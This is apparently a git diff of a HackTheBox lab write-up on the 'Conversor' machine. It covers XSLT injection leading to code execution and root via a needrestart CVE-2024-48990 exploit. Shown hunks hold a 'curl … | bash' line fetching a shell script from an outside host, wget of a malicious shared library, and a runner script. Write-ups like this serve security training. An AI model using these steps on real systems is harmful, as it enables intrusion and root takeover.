@@ -1,11 +1,12 @@
 ---
 title: Conversor - XSLT injection to RCE
 date: 2025-12-06 00:00:00 +0000
-categories: [HackTheBox Writeups]
+categories: [HackTheBox Writeups, Linux]
 tags: [hackthebox, linux]
 ---
 
-```bash
+
+```
 ares@legion:~$ sudo nmap -sVC -A -T4 -p- --min-rate 1000 $target
 Nmap scan report for 10.129.90.161 (10.129.90.161)
 Host is up (0.055s latency).
@@ -33,11 +34,11 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 68.44 seconds
 ```
-![20251130160025.png](/assets/img/htb-writeups/Pasted image 20251130160025.png)
+![[Pasted image 20251130160025.png]]
 
 /about page:
-![20251130164627.png](/assets/img/htb-writeups/Pasted image 20251130164627.png)
-```bash
+![[Pasted image 20251130164627.png]]
+```
 tar xvf source_code.tar.gz 
 app.py
 app.wsgi
@@ -61,9 +62,9 @@ templates/base.html
 templates/result.html
 uploads/
 ```
-```python
+
 install.md
-![20251130165002.png](/assets/img/htb-writeups/Pasted image 20251130165002.png)
+![[Pasted image 20251130165002.png]]
 app.py > python crontab
 
 ```
@@ -113,27 +114,28 @@ os.system("curl 10.10.15.8:8000/shell.sh | bash")
     </xsl:template>
 </xsl:stylesheet>
 
-```bash
-![20251130164348.png](/assets/img/htb-writeups/Pasted image 20251130164348.png)
+```
+
+![[Pasted image 20251130164348.png]]
 
 We have empty user.db in instances from source code // verify on rev shell:
-![20251130170242.png](/assets/img/htb-writeups/Pasted image 20251130170242.png)
+![[Pasted image 20251130170242.png]]
 
-![20251130170406.png](/assets/img/htb-writeups/Pasted image 20251130170406.png)
+![[Pasted image 20251130170406.png]]
 SSh with creds
 
 Privesc:
-![20251130170753.png](/assets/img/htb-writeups/Pasted image 20251130170753.png)
+![[Pasted image 20251130170753.png]]
 
 Search CVE for version:
-![20251130170903.png](/assets/img/htb-writeups/Pasted image 20251130170903.png)
+![[Pasted image 20251130170903.png]]
 
 Vulnerable to:
 https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
 https://github.com/makuga01/CVE-2024-48990-PoC/
 
 Compile payload on your machine:
-```bash
+```
 // lib.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -148,11 +150,13 @@ void a() {
     }
 }
 ```
+
 ```
 gcc -shared -fPIC -o __init__.so lib.c
-```bash
+```
+
 On victim machine, create runner:
-```bash
+```
 mkdir -p /tmp/malicious/importlib
 wget http://YOUR_IP:8000/__init__.so -O /tmp/malicious/importlib/__init__.so
 
@@ -170,12 +174,14 @@ while True:
 EOF
 
 cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py
-```bash
+```
+
 another ssh tab and run the binary: 
 ```
 sudo /usr/sbin/needrestart
 ```
-```bash
+
+```
 root@conversor:/tmp/malicious# id
 uid=0(root) gid=0(root) groups=0(root)
-```bash
+```
